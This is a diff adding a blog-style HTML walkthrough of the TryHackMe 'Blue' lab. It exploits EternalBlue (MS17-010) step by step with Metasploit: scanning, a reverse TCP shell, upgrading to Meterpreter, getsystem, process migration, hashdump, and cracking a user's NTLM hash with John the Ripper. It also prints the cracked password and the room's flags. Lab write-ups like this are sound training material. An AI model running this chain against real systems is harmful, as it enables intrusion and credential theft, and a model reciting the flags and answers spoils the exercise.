@@ -1,0 +1,217 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe Blue | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TryHackMe Blue" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthrough/Writeup of a TryHackMe room about EternalBlue, the SMB protocol and Windows" />
+<meta property="og:description" content="Walkthrough/Writeup of a TryHackMe room about EternalBlue, the SMB protocol and Windows" />
+<link rel="canonical" href="http://localhost:4000/tryhackme/Blue/" />
+<meta property="og:url" content="http://localhost:4000/tryhackme/Blue/" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe Blue" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthrough/Writeup of a TryHackMe room about EternalBlue, the SMB protocol and Windows","headline":"TryHackMe Blue","url":"http://localhost:4000/tryhackme/Blue/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="blue"><a href="https://tryhackme.com/room/blue">Blue</a><!-- omit in toc --></h1>
+
+<p>“Blue” is an entry-level TryHackMe room, designed to introduce users to basic Windows exploitation techniques. The main objective is to gain root access by exploiting a known vulnerability in the SMB (Server Message Block) protocol. Specifically, the target machine is vulnerable to <a href="https://it.wikipedia.org/wiki/EternalBlue">EternalBlue</a> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0144">CVE-2017-0144</a>), a critical flaw in Microsoft’s SMBv1 implementation.</p>
+
+<p>EternalBlue was originally developed by the NSA and later leaked by the Shadow Brokers in 2017. It has since been widely used in various attacks, including the WannaCry ransomware outbreak. In this room, you’ll scan the target for open ports and services, identify the SMB vulnerability, and use a Metasploit module or custom exploit to gain remote code execution. Once access is achieved, the final goal is to escalate privileges and capture the root flag.</p>
+
+<p>This machine can be downloaded from <a href="https://darkstar7471.com/resources.html">this page</a>.</p>
+
+<h3 id="table-of-contents">Table of contents:</h3>
+<ul>
+  <li><a href="#recon">Recon</a></li>
+  <li><a href="#gain-access">Gain Access</a></li>
+  <li><a href="#escalate">Escalate</a></li>
+  <li><a href="#cracking">Cracking</a></li>
+  <li><a href="#find-flags">Find flags!</a></li>
+</ul>
+
+<hr />
+
+<h2 id="recon">Recon</h2>
+<p>To get through this section you’ll need to install <a href="https://nmap.org/">nmap</a> or use nmap inside of <a href="https://www.metasploit.com/">Metasploit</a> (which you will need later).</p>
+
+<ol>
+  <li>How many ports are open with a port number under 1000?</li>
+  <li>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</li>
+</ol>
+
+<p>We can answer these questions with just one nmap scan:</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap --script vuln [target_IP]</code>
+This will return all open ports (9 in total, 3 under port 1000) and all known vulnerabilities (including the EternalBlue exploit, or ms17-010).
+<img src="/assets/images/thm/blue/ports.png" alt="nmap" /></p>
+
+<h2 id="gain-access">Gain Access</h2>
+<p>To get through this section you’ll need to install the Metasploit framework. Then:</p>
+
+<p>Become root: <code class="language-plaintext highlighter-rouge">sudo su</code></p>
+
+<p>Open up Metasploit: <code class="language-plaintext highlighter-rouge">msfconsole</code></p>
+
+<p>Set your local IP address as LHOST and LPORT to a random port that is not already in use:</p>
+
+<p><code class="language-plaintext highlighter-rouge">set LHOST tun0</code>
+<code class="language-plaintext highlighter-rouge">set LPORT 4444</code></p>
+
+<p>Search Metasploit’s database for the EternalBlue exploit: <code class="language-plaintext highlighter-rouge">search ms17-010</code></p>
+
+<p><img src="/assets/images/thm/blue/ms17-010.png" alt="ms17-010" /></p>
+
+<p>Use the exploit: <code class="language-plaintext highlighter-rouge">use exploit/windows/smb/ms17_010_eternalblue</code></p>
+
+<p>Show the options for the exploit: <code class="language-plaintext highlighter-rouge">show options</code>. You’ll get “RHOSTS” as the first result.</p>
+
+<p><img src="/assets/images/thm/blue/options.png" alt="options" /></p>
+
+<p>Now set RHOSTS as the target machine’s IP address: <code class="language-plaintext highlighter-rouge">set RHOSTS</code> [target_IP]</p>
+
+<p>Set the payload: <code class="language-plaintext highlighter-rouge">set payload windows/x64/shell/reverse_tcp</code></p>
+
+<p>Run the exploit: <code class="language-plaintext highlighter-rouge">run</code></p>
+
+<h2 id="escalate">Escalate</h2>
+<p>Background the session with Ctrl+z (then press <code class="language-plaintext highlighter-rouge">y</code> when prompted).</p>
+
+<p>Let’s now search the Metasploit database for info on how to convert a shell to a Meterpreter shell:
+<code class="language-plaintext highlighter-rouge">search shell_to_meterpreter</code></p>
+
+<p>This way we will get the answer: <code class="language-plaintext highlighter-rouge">post/multi/manage/shell_to_meterpreter</code>.</p>
+
+<p><img src="/assets/images/thm/blue/shell.png" alt="shell" /></p>
+
+<p>Use this post module with <code class="language-plaintext highlighter-rouge">use 0</code> and show its’ options with show options.</p>
+
+<p><img src="/assets/images/thm/blue/session.png" alt="session" /></p>
+
+<p>Since we have two sessions going on, we will have to change the SESSION option to 1 with <code class="language-plaintext highlighter-rouge">set SESSION 1</code>. To know to which session you have to switch, use the command <code class="language-plaintext highlighter-rouge">sessions -l</code>.</p>
+
+<p><img src="/assets/images/thm/blue/sessions.png" alt="sessions" /></p>
+
+<p>Now run the exploit with <code class="language-plaintext highlighter-rouge">run</code>.
+Once we get the [*] Stopping exploit/multi/handler message, press Ctrl+c to stop that payload and select the session you just created with <code class="language-plaintext highlighter-rouge">sessions -i 2</code> or whatever number your session is (look for it with <code class="language-plaintext highlighter-rouge">sessions -l</code>).</p>
+
+<p><img src="/assets/images/thm/blue/session2.png" alt="session2" /></p>
+
+<p><img src="/assets/images/thm/blue/meterpreter.png" alt="meterpreter" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">getsystem</code> command will now return this:</p>
+
+<p><img src="/assets/images/thm/blue/ports.png" alt="system" /></p>
+
+<p>You can also list all the processes with the <code class="language-plaintext highlighter-rouge">ps</code> command and you can migrate to one of these.</p>
+
+<p><img src="/assets/images/thm/blue/ps.png" alt="ps" /></p>
+
+<p>Find a process that runs at <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code> and copy its’ PID.
+Now migrate to it with <code class="language-plaintext highlighter-rouge">migrate [PID]</code> (e.g., <code class="language-plaintext highlighter-rouge">migrate 2868</code>).</p>
+
+<h2 id="cracking">Cracking</h2>
+<p>Now use the <code class="language-plaintext highlighter-rouge">hashdump</code> command.</p>
+
+<p><img src="/assets/images/thm/blue/hashdump.png" alt="hashdump" /></p>
+
+<p>Jon is the non-default user. Copy the NTLM digest.
+Then we’ll copy the digest to a file with:</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: &gt; hash.txt</code>
+We’ll run John The Ripper on the file with:
+<code class="language-plaintext highlighter-rouge">john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></p>
+
+<p>This will return <code class="language-plaintext highlighter-rouge">alqfna22</code> as the password.
+<img src="/assets/images/thm/blue/john.png" alt="john" /></p>
+
+<h2 id="find-flags">Find flags!</h2>
+<p>The first flag is located in the <code class="language-plaintext highlighter-rouge">C:\</code> folder:</p>
+
+<blockquote>
+  <p>flag{access_the_machine}</p>
+</blockquote>
+
+<p>The second flag is located in the <code class="language-plaintext highlighter-rouge">C:\Windows\System32\config</code> folder:</p>
+
+<blockquote>
+  <p>flag{sam_database_elevated_access}</p>
+</blockquote>
+
+<p>The third one is in <code class="language-plaintext highlighter-rouge">C:\Users\Jon\Documents</code>:</p>
+
+<blockquote>
+  <p>flag{admin_documents_can_be_valuable}</p>
+</blockquote>
+
+<p>That’s all, hope I helped.</p>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
